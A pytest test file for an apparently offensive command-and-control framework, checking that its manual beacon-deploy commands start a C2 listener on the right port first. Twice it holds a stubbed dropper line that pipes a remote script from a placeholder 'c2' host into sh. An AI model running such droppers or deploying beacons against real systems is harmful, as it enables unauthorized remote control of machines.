"""The manual dropper paths must not deploy a beacon nobody answers.

Auto-mode brings its own listener up BEFORE every deploy (`_ensure_c2_listener`),
but the manual paths did not: `exploit deploy-agent` compiled a dropper, printed
it, and only *warned* at the end; `payload deploy` did not even look, and told
the operator "the beacon checks in to your C2" with nothing listening. The audit
called it the direct contradiction of requirement 6 (handoff) inside the manual
path — a beacon deployed by hand that has nobody to check in to.

Both now use the SAME helper and the same `c2.listener_auto_start` gate as
auto-mode. When the port the dropper dials is not the port a listener would bind
(`session.lport` set to something else), the helper is NOT called: starting a
listener on the wrong port would leave the beacon dialling into nothing, so the
operator is told the exact command instead.
"""
import io
import sys

import pytest

from phantom.modules.payload import PayloadModule

C2_HOST = "10.0.0.5"
C2_PORT = 8080


@pytest.fixture
def listener(monkeypatch):
    """Record listener bring-ups; never touch a real socket.

    Returns a dict: ``["calls"]`` is the call log, set ``["result"]`` to decide
    whether the listener could be brought up.
    """
    state = {"calls": [], "result": True}

    def fake_ensure(server=None):
        state["calls"].append(server)
        return state["result"]

    monkeypatch.setattr("phantom.core.automode.ensure_c2_listener", fake_ensure)
    return state


@pytest.fixture
def payload_ready(monkeypatch):
    """Everything `payload deploy` needs, with the toolchain stubbed out."""
    monkeypatch.setattr(PayloadModule, "_guess_os",
                        lambda self: ("Linux", "x64", "linux"))
    monkeypatch.setattr("phantom.utils.builder.compile_beacon",
                        lambda *a, **kw: "/tmp/beacon")
    monkeypatch.setattr("phantom.utils.builder.generate_dropper",
                        lambda *a, **kw: "curl -s http://c2/x | sh")
    monkeypatch.setattr("phantom.utils.network.c2_use_ssl", lambda: False)
    monkeypatch.setattr("phantom.utils.network.get_c2_endpoint",
                        lambda: (C2_HOST, C2_PORT))
    from phantom.utils import config as cfg
    monkeypatch.setattr(cfg, "get",
                        lambda key, default=None, **kw: C2_HOST
                        if key == "c2.host" else default)
    monkeypatch.setattr(cfg, "get_int",
                        lambda key, default=0, **kw: C2_PORT
                        if key == "c2.port" else default)


def _capture(fn) -> str:
    """Capture stdout, with runs of whitespace collapsed to single spaces.

    Rich wraps long lines at the console width, so a phrase like "nowhere to
    check in" can straddle a line break; flattening makes the assertions about
    what was SAID rather than where it wrapped.
    """
    buffer = io.StringIO()
    original = sys.stdout
    sys.stdout = buffer
    try:
        fn()
    finally:
        sys.stdout = original
    return " ".join(buffer.getvalue().split())


def test_the_manual_path_shares_the_auto_mode_helper():
    """One listener policy, not two — the alias is the same function object."""
    from phantom.core import automode

    assert automode.ensure_c2_listener is automode._ensure_c2_listener


def test_payload_deploy_brings_the_listener_up_then_says_so(payload_ready,
                                                            listener):
    text = _capture(lambda: PayloadModule().do_deploy("")).lower()
    assert listener["calls"], "payload deploy never tried to bring a listener up"
    assert "listener up" in text
    assert "checks in to your c2" in text


def test_payload_deploy_does_not_claim_a_check_in_without_a_listener(
        payload_ready, listener):
    """The failure the audit named: an announcement with nothing listening."""
    listener["result"] = False
    lowered = _capture(lambda: PayloadModule().do_deploy("")).lower()
    assert listener["calls"], "the listener was never even attempted"
    assert "nowhere to check in" in lowered
    assert "listener up" not in lowered


def test_payload_deploy_refuses_to_start_a_listener_on_the_wrong_port(
        payload_ready, listener, monkeypatch):
    """A dropper dialling 4444 while the listener binds 8080 is a dead beacon."""
    monkeypatch.setattr("phantom.utils.network.get_c2_endpoint",
                        lambda: (C2_HOST, 4444))
    text = _capture(lambda: PayloadModule().do_deploy("")).lower()
    assert listener["calls"] == [], "started a listener on the wrong port"
    assert "start the listener on 8080" in text


@pytest.fixture
def exploit_ready(monkeypatch):
    from phantom.core.c2_server import server_instance
    from phantom.core.session import session

    monkeypatch.setattr(server_instance, "thread", None, raising=False)
    monkeypatch.setattr(server_instance, "port", C2_PORT, raising=False)
    monkeypatch.setattr(session, "lport", 0, raising=False)
    monkeypatch.setattr("phantom.utils.network.get_lhost", lambda: C2_HOST)
    monkeypatch.setattr("phantom.utils.network.get_c2_endpoint",
                        lambda: (C2_HOST, C2_PORT))
    monkeypatch.setattr("phantom.utils.builder.compile_beacon",
                        lambda *a, **kw: "/tmp/beacon")
    monkeypatch.setattr("phantom.utils.builder.generate_dropper",
                        lambda *a, **kw: "curl -s http://c2/x | sh")
    monkeypatch.setattr("phantom.utils.payload_manager.add_custom_beacon",
                        lambda *a, **kw: None)
    return session


def test_deploy_agent_brings_the_listener_up(exploit_ready, listener):
    from phantom.modules.exploit import ExploitModule

    text = _capture(lambda: ExploitModule().do_deploy_agent("linux")).lower()
    assert listener["calls"], "deploy-agent never tried to bring a listener up"
    assert "listener up" in text or "listener active" in text


def test_deploy_agent_does_not_restart_an_running_listener(exploit_ready,
                                                           listener,
                                                           monkeypatch):
    from phantom.core.c2_server import server_instance
    from phantom.modules.exploit import ExploitModule

    alive = type("T", (), {"is_alive": lambda self: True})()
    monkeypatch.setattr(server_instance, "thread", alive, raising=False)
    text = _capture(lambda: ExploitModule().do_deploy_agent("linux")).lower()
    assert listener["calls"] == [], "started a second listener"
    assert "listener active" in text


def test_deploy_agent_reports_a_port_it_cannot_serve(exploit_ready, listener,
                                                     monkeypatch):
    """`lport` picks the port the dropper dials; if it is not the C2 endpoint,
    the honest answer is the command to run — not a listener on the wrong one."""
    exploit_ready.lport = 4444
    from phantom.modules.exploit import ExploitModule

    text = _capture(lambda: ExploitModule().do_deploy_agent("linux"))
    assert listener["calls"] == [], "started a listener on the wrong port"
    assert "listeners start 4444" in text
